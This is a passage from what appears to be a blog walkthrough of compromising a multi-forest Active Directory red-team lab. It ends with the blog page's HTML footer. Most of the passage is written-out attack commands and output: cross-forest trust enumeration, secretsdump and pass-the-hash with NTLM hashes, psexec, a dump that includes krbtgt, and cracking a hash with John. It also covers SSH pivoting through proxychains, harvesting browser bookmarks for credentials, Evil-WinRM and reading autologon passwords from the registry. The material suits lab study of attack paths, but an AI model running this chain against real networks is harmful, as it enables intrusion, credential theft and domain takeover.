+<p>Another domain “mgmt.corp” having a bi-directional trust has been identified in the above result. A Foreign Security Principal can indirectly be used to abuse the cross-forest trust. Let’s enumerate FSP’s available on the identified domain “mgmt.corp”.</p>
+<p>Enumerate FSPs on mgmt.corp domain<br>𝐺𝑒𝑡−𝐴𝐷𝑂𝑏𝑗𝑒𝑐𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 {𝑜𝑏𝑗𝑒𝑐𝑡𝐶𝑙𝑎𝑠𝑠 −𝑒𝑞 “𝑓𝑜𝑟𝑒𝑖𝑔𝑛𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙”} −𝑠𝑒𝑟𝑣𝑒𝑟 𝑚𝑔𝑚𝑡.𝑐𝑜𝑟𝑝<br>A Foreign Security Principal is available on the “mgmt.corp” domain, this means a user in the current domain “els.corp” is present in the target “mgmt.corp” domain:</p>
+<p>Convert the identified user to SID:</p>
+<p>Identify User:<br>𝐺𝑒𝑡−𝐴𝐷𝑈𝑠𝑒𝑟 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ |?{$_.𝑆𝐼𝐷 −𝑒𝑞 ′𝑆−1−5−21−286056459−1157968049−2884264478−1107′}<br>The foreign user can be identified as “forest_user” of the els.corp domain:</p>
+<p>We need to identify the privileges of “forest_user” in the mgmt.corp domain.</p>
+<p>Identify on which group ‘forest_user’ is added at mgmt.corp domain:<br>𝐺𝑒𝑡−𝐴𝐷𝐺𝑟𝑜𝑢𝑝 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ −𝑃𝑟𝑜𝑝𝑒𝑟𝑡𝑖𝑒𝑠 𝑀𝑒𝑚𝑏𝑒𝑟 −𝑠𝑒𝑟𝑣𝑒𝑟 𝑚𝑔𝑚𝑡.𝑐𝑜𝑟𝑝 |?{$_.𝑀𝑒𝑚𝑏𝑒𝑟 −𝑚𝑎𝑡𝑐ℎ ′𝑆−1−5−21−3658202825−2428483480−107650130−1107′}<br>It comes out that ‘forest_user’ is added to local administrators of the ‘mgmt.corp’ domain.</p>
+<p>Now, we need to extract the credentials of ‘forest_user’ and then we will perform PTH to the “mgmt.corp” domain.</p>
+<p>Run secretsdump against mgmt.corp domain:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑠𝑒𝑐𝑟𝑒𝑡𝑠𝑑𝑢𝑚𝑝.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.1.3 𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛@𝐸𝐿𝑆−𝐷𝐶 −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:8645𝑒87𝑒2593507𝑐𝑓623𝑓3291𝑏1334𝑐2</p>
+<Result>
+𝑒𝑙𝑠.𝑐𝑜𝑟𝑝\𝑓𝑜𝑟𝑒𝑠𝑡_𝑢𝑠𝑒𝑟:1107:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:𝑏7001𝑏2𝑑𝑏𝑒0𝑓𝑏𝑑𝑏𝑑62𝑒𝑒4𝑏3𝑏𝑑𝑒2410𝑏9
+</Result>
+
+
+<p>Credentials of “forest_user” are extracted as follows:</p>
+<p>We will now perform psexec against the ‘mgmt-DC’ server. The IP address of mgmt.corp domain can be enumerated using a simple DNS query (i.e nslookup mgmt.corp).</p>
+<p>MGMT-DC Server<br>Using “forest_user” we can establish a persistent connection using impacket’s psexec script since it is a member of local administrators in the mgmt.corp domain.</p>
+<p>Psexec as ‘forest_user’ on ‘mgmt.corp’ domain:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.3.2 𝑓𝑜𝑟𝑒𝑠𝑡_𝑢𝑠𝑒𝑟@𝑀𝐺𝑀𝑇−𝐷𝐶 −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:𝑏7001𝑏2𝑑𝑏𝑒0𝑓𝑏𝑑𝑏𝑑62𝑒𝑒4𝑏3𝑏𝑑𝑒2410𝑏9</p>
+<p>Switch to PowerShell<br>You will see something similar to the below.</p>
+<p>We will also use the Active Directory Module present in the server to list any OU present in the MGMT-DC and all the members present in the available OU’s.</p>
+<p>LIST all OU’s in MGMT.CORP<br>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦<br>𝐺𝑒𝑡−𝐴𝐷𝑂𝑏𝑗𝑒𝑐𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 {𝑂𝑏𝑗𝑒𝑐𝑡𝐶𝑙𝑎𝑠𝑠 −𝑒𝑞 ‘𝑜𝑟𝑔𝑎𝑛𝑖𝑧𝑎𝑡𝑖𝑜𝑛𝑎𝑙𝑢𝑛𝑖𝑡’} −𝑃𝑟𝑜𝑝𝑒𝑟𝑡𝑖𝑒𝑠 𝐶𝑎𝑛𝑜𝑛𝑖𝑐𝑎𝑙𝑁𝑎𝑚𝑒 | 𝑆𝑒𝑙𝑒𝑐𝑡−𝑂𝑏𝑗𝑒𝑐𝑡 𝐷𝑖𝑠𝑡𝑖𝑛𝑔𝑢𝑖𝑠ℎ𝑒𝑑𝑁𝑎𝑚𝑒</p>
+<p>Get Members of “Bastion-Host” OU<br>$𝑜𝑢𝑝𝑎𝑡ℎ = “𝑂𝑈=𝐵𝑎𝑠𝑡𝑖𝑜𝑛−𝐻𝑜𝑠𝑡,𝐷𝐶=𝑚𝑔𝑚𝑡,𝐷𝐶=𝑐𝑜𝑟𝑝”<br>𝐺𝑒𝑡−𝐴𝐷𝑈𝑠𝑒𝑟 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ −𝑆𝑒𝑎𝑟𝑐ℎ𝐵𝑎𝑠𝑒 $𝑜𝑢𝑝𝑎𝑡ℎ<br>(𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛 𝑢𝑠𝑒𝑟 𝑑𝑖𝑠𝑐𝑜𝑣𝑒𝑟𝑒𝑑 )<br>The Domain user “Jump-Admin” present in the “Bastion-Host” OU can be useful in moving forward from the MGMT-DC server. The IP address of “jump-srv” server can be enumerated by actively querying the DNS record.</p>
+<p>𝑛𝑠𝑙𝑜𝑜𝑘𝑢𝑝 𝑗𝑢𝑚𝑝−𝑠𝑟𝑣</p>
+<p>&lt;..SNIP..&gt;<br>Name: jump-srv.mgmt.corp<br>IP Address: 10.10.3.3<br>&lt;../SNIP..&gt;<br>However, we will extract all the credentials present in the MGMT.CORP domain leveraging impacket’s sercretsdump.py script.</p>
+<p>On a new bash prompt using our route to internal network [10.10.3.0/24], we will execute secretsdump.py as follows:</p>
+<p>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑒𝑐𝑟𝑒𝑡𝑠𝑑𝑢𝑚𝑝. 𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.3.2 𝑠𝑝𝑛_𝑠𝑣𝑐@𝑀𝐺𝑀𝑇−𝐷𝐶.𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃</p>
+<p>[..SNIP..]<br>𝒎𝒈𝒎𝒕−𝒂𝒅𝒎𝒊𝒏:500:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:86𝑐64𝑎256𝑒8𝑎𝑒𝑏2𝑒𝑑𝑓31𝑏4157𝑏𝑓6𝑏𝑒𝑐𝑏:::<br>𝒌𝒓𝒃𝒕𝒈𝒕:502:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:2𝑎7𝑎0𝑓537983𝑏𝑎𝑐4120725𝑑055𝑓𝑐𝑏𝑏𝑎9:::<br>𝒎𝒈𝒎𝒕.𝒄𝒐𝒓𝒑\𝒋𝒖𝒎𝒑−𝒂𝒅𝒎𝒊𝒏:1104:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:𝟐𝒅𝒄𝟗𝒃𝒇𝒇𝟑𝟗𝟕𝒇𝟗𝒆𝟔𝒄𝟗𝒇𝟎𝟖𝒂𝟎𝟓𝒃𝟏𝟖𝟏𝟒𝟓𝒂𝟕𝒃𝟔:::<br>𝒎𝒈𝒎𝒕.𝒄𝒐𝒓𝒑\𝒔𝒑𝒏_𝒔𝒗𝒄:1106:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:2𝑑𝑐9𝑏𝑓𝑓397𝑓9𝑒6𝑐9𝑓08𝑎05𝑏18145𝑎7𝑏6:::<br>[..SNIP..]<br>Crack the “jump-admin” hash using JTR [John] by storing the NT hash in a file.</p>
+<p>→ Crack jump-admin hash(2dc9bff397f9e6c9f08a05b18145a7b6):</p>
+<p>Copy the hash “2dc9bff397f9e6c9f08a05b18145a7b6” in jump-adminpass.txt file</p>
+<p>𝑗𝑜ℎ𝑛 −−𝑓𝑜𝑟𝑚𝑎𝑡=𝑁𝑇 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛𝑝𝑎𝑠𝑠.𝑡𝑥𝑡 −𝑤=/𝑢𝑠𝑟/𝑠ℎ𝑎𝑟𝑒/𝑤𝑜𝑟𝑑𝑙𝑖𝑠𝑡𝑠/𝑟𝑜𝑐𝑘𝑦𝑜𝑢.𝑡𝑥𝑡<br>The hash is cracked and we now have clear text credentials of the “jump-admin” user at the “Jump-Admin” machine.</p>
+<p>Jump-Srv<br>Let’s perform a TCP port scan against the target 10.10.3.3 [jump-srv.mgmt.corp] using nmap and leveraging the route to the 10.10.3.0/24 network.</p>
+<p>With meterpreter active route to “10.10.3.0/24” network &amp; on new bash shell<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑛𝑚𝑎𝑝 −−𝑡𝑜𝑝−𝑝𝑜𝑟𝑡𝑠 10 −𝑠𝑇 −𝑠𝑉 −𝑃𝑛 10.10.3.3</p>
+<p>&lt;..SNIP..&gt;<br>𝑁𝑚𝑎𝑝 𝑠𝑐𝑎𝑛 𝑟𝑒𝑝𝑜𝑟𝑡 𝑓𝑜𝑟 10.10.3.3<br>𝐻𝑜𝑠𝑡 𝑖𝑠 𝑢𝑝 (2.4𝑠 𝑙𝑎𝑡𝑒𝑛𝑐𝑦).<br>𝑃𝑂𝑅𝑇 𝑆𝑇𝐴𝑇𝐸 𝑆𝐸𝑅𝑉𝐼𝐶𝐸 𝑉𝐸𝑅𝑆𝐼𝑂𝑁<br>21/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑓𝑡𝑝<br>𝟐𝟐/𝒕𝒄𝒑 𝒐𝒑𝒆𝒏 𝒔𝒔𝒉 𝑶𝒑𝒆𝒏𝑺𝑺𝑯 𝟕.𝟐𝒑𝟐 𝑼𝒃𝒖𝒏𝒕𝒖 𝟒𝒖𝒃𝒖𝒏𝒕𝒖𝟐.𝟖 (𝑼𝒃𝒖𝒏𝒕𝒖 𝑳𝒊𝒏𝒖𝒙;𝒑𝒓𝒐𝒕𝒐𝒄𝒐𝒍 𝟐.𝟎)<br>23/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑡𝑒𝑙𝑛𝑒𝑡<br>25/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑠𝑚𝑡𝑝<br>80/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 ℎ𝑡𝑡𝑝<br>110/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑝𝑜𝑝3<br>&lt;..SNIP..&gt;<br>SSH server is running on TCP port 22. As ‘jump-srv.mgmt.corp’ machine is managed by “jump-admin”, we can try to do SSH to ‘10.10.3.3’ machine using Jump-Admin Domain user.</p>
+<p>Perform SSH to 10.10.3.3 as jump-admin domain user.</p>
+<p>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑠ℎ −𝑙 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛@𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃 10.10.3.3<br>NOTE: enter jump-admin cracked password ‘B@DB!tch’<br>We successfully SSHed to Jump-SRV.mgmt.corp as the “jump-admin” domain user.</p>
+<p>Let’s also extract the bookmark URLs of Firefox in this machine and look if any interesting information can</p>
+<p>be found (as jump-admin user).</p>
+<p>As ‘Jump-admin’ domain user<br>𝑐𝑑 /.𝑚𝑜𝑧𝑖𝑙𝑙𝑎/𝑓𝑖𝑟𝑒𝑓𝑜𝑥/2𝑠3𝑝6𝑚1𝑣.𝑑𝑒𝑓𝑎𝑢𝑙𝑡−𝑟𝑒𝑙𝑒𝑎𝑠𝑒<br>𝑠𝑞𝑙𝑖𝑡𝑒3 𝑝𝑙𝑎𝑐𝑒𝑠.𝑠𝑞𝑙𝑖𝑡𝑒</p>
+<p>Inside SQLite<br>.𝑡𝑎𝑏𝑙𝑒𝑠<br>𝑠𝑒𝑙𝑒𝑐𝑡 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠.𝑢𝑟𝑙 𝑓𝑟𝑜𝑚 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠;<br>.𝑞𝑢𝑖𝑡</p>
+<p>𝑓𝑜𝑢𝑛𝑑 𝑈𝑅𝐿: 𝒉𝒕𝒕𝒑𝒔://𝒂𝒅𝒎𝒊𝒏−𝒔𝒚𝒔.𝒔𝒊𝒕𝒆/𝒍𝒐𝒈𝒊𝒏.𝒂𝒔𝒑?𝒖𝒔𝒆𝒓=𝒔𝒚𝒔−𝒂𝒅𝒎𝒊𝒏&amp;𝒑𝒂𝒔𝒔=𝑹𝒂𝒏𝒅𝟎𝒎𝒍𝒚𝑺𝟑𝒍𝟑𝒄𝒕𝒆𝒅𝑷@𝒔𝒔<br>However, using firefox with proxychains querying the login URL, shows that it is non-existent, Now enumerate the IP address of admin-sys server by pinging the URL.</p>
+<p>𝑝𝑖𝑛𝑔 𝑎𝑑𝑚𝑖𝑛−𝑠𝑦𝑠.𝑠𝑖𝑡𝑒<br>Discovered IP address [192.168.1.2]<br>Performing TCP port scan on the target “192.168.1.2” reveals that the 5985 port is open, which means one can always do PowerShell Remoting.</p>
+<p>Admin-SYS<br>In order to perform PowerShell Remoting, we need to apply some port forwarding techniques.</p>
+<p>Exit the SSH session and re-establish a new session with port forwarding switches.</p>
+<p>Using port forwarding, we are specifying that all the traffic sent locally will be forwarded to the ‘admin-sys’ server [192.168.1.2]</p>
+<p>On a new bash session<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑠ℎ −𝑙 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛@𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃 10.10.3.3 −𝐿 5985:192.168.1.2:5985<br>(Now at this very particular point, traffic from your attacker machine can reach the admin-sys machine)</p>
+<p>Use Evil-WinRM to connect to 192.168.1.2 machine with the discovered credentials<br>./𝑒𝑣𝑖𝑙−𝑤𝑖𝑛𝑟𝑚.𝑟𝑏 −𝑖 127.0.0.1 −𝑢 𝑠𝑦𝑠−𝑎𝑑𝑚𝑖𝑛 −𝑝 𝑅𝑎𝑛𝑑0𝑚𝑙𝑦𝑆3𝑙3𝑐𝑡𝑒𝑑𝑃@𝑠𝑠<br>Enumerating the environment reveals that “sys-admin” is a local user at the admin-sys server. Privilege escalation can be done by querying the autologin registry.</p>
+<p>Clear Text credentials of Administrator are found.</p>
+<p>On the recently established WinRM session<br>𝑟𝑒𝑔 𝑞𝑢𝑒𝑟𝑦 “𝐻𝐾𝐿𝑀\𝑆𝑂𝐹𝑇𝑊𝐴𝑅𝐸\𝑀𝑖𝑐𝑟𝑜𝑠𝑜𝑓𝑡\𝑊𝑖𝑛𝑑𝑜𝑤𝑠 𝑁𝑇\𝐶𝑢𝑟𝑟𝑒𝑛𝑡𝑣𝑒𝑟𝑠𝑖𝑜𝑛\𝑊𝑖𝑛𝑙𝑜𝑔𝑜𝑛”</p>
+<p>&lt;..SNIP..&gt;<br>𝐻𝐾𝐸𝑌_𝐿𝑂𝐶𝐴𝐿_𝑀𝐴𝐶𝐻𝐼𝑁𝐸\𝑆𝑂𝐹𝑇𝑊𝐴𝑅𝐸\𝑀𝑖𝑐𝑟𝑜𝑠𝑜𝑓𝑡\𝑊𝑖𝑛𝑑𝑜𝑤𝑠 𝑁𝑇\𝐶𝑢𝑟𝑟𝑒𝑛𝑡𝑣𝑒𝑟𝑠𝑖𝑜𝑛\𝑊𝑖𝑛𝑙𝑜𝑔𝑜𝑛<br>𝐴𝑢𝑡𝑜𝑅𝑒𝑠𝑡𝑎𝑟𝑡𝑆ℎ𝑒𝑙𝑙 𝑅𝐸𝐺_𝐷𝑊𝑂𝑅𝐷 0𝑥1<br>𝐵𝑎𝑐𝑘𝑔𝑟𝑜𝑢𝑛𝑑 𝑅𝐸𝐺_𝑆𝑍 0 0 0<br>𝐶𝑎𝑐ℎ𝑒𝑑𝐿𝑜𝑔𝑜𝑛𝑠𝐶𝑜𝑢𝑛𝑡 𝑅𝐸𝐺_𝑆𝑍 10<br>𝐷𝑒𝑏𝑢𝑔𝑆𝑒𝑟𝑣𝑒𝑟𝐶𝑜𝑚𝑚𝑎𝑛𝑑 𝑅𝐸𝐺_𝑆𝑍 𝑛𝑜<br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝑈𝑠𝑒𝑟𝑁𝑎𝑚𝑒 𝑅𝐸𝐺_𝑆𝑍 𝑨𝒅𝒎𝒊𝒏𝒊𝒔𝒕𝒓𝒂𝒕𝒐𝒓<br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑁𝑎𝑚𝑒 𝑅𝐸𝐺_𝑆𝑍 𝑊𝐼𝑁−10−𝑃𝑅𝑂−𝑋64<br>𝐴𝑢𝑡𝑜𝐴𝑑𝑚𝑖𝑛𝐿𝑜𝑔𝑜𝑛 𝑅𝐸𝐺_𝑆𝑍 1<br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 𝑅𝐸𝐺_𝑆𝑍 𝑻𝒆𝒔𝒕@𝟏𝟐𝟑<br>&lt;..SNIP..&gt;<br>Reconnect to the ‘admin-sys’ server with local administrator credentials.</p>
+<p>./𝑒𝑣𝑖𝑙−𝑤𝑖𝑛𝑟𝑚.𝑟𝑏 −𝑖 127.0.0.1 −𝑢 𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟 −𝑝 𝑇𝑒𝑠𝑡@123<br>𝑡𝑦𝑝𝑒 𝐶:\𝑈𝑠𝑒𝑟𝑠\𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟\𝐷𝑒𝑠𝑘𝑡𝑜𝑝\𝑇𝑟𝑖𝑢𝑚𝑝ℎ.𝑡𝑥𝑡</p>
+<Result>
+CONGRATULATIONS, YOU HAVE SUCCESSFULLY COMPROMISED MULTI-FOREST RED TEAM ENVIRONMENT!!
+<3
+</Result>
+Congratulations!!
+
+<p>The Multi-Forest Red Team Environment is successfully compromised.</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
+                    
+                  </div>
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%89/">
+                        <span class="hidden-mobile">攻击链六：域渗透案例三</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+                        
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+    </body>
+
+  </html>
